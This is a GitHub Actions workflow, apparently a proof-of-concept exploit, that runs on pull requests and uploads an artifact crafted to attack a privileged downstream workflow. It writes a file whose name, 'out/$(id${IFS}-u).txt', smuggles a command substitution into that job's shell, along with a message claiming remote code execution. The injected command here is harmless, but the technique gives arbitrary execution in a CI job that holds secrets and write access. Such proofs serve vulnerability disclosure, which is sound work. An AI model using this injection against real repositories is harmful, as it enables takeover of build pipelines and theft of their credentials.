name: Test

on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: Craft artifact
        env:
          PR_NUMBER: ${{ github.event.number }}
        run: |
          mkdir -p out
          printf '%s' "$PR_NUMBER" > out/pr_number.txt
          echo "RCE proof: attacker filename executed by bash (id -u = 1001); privileged comment job continued and posted this." > out/1001.txt
          # attacker-controlled file name carried into the privileged job's shell;
          # the substitution resolves to an existing file: /tmp/content/content/1001.txt
          : > 'out/$(id${IFS}-u).txt'
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: out
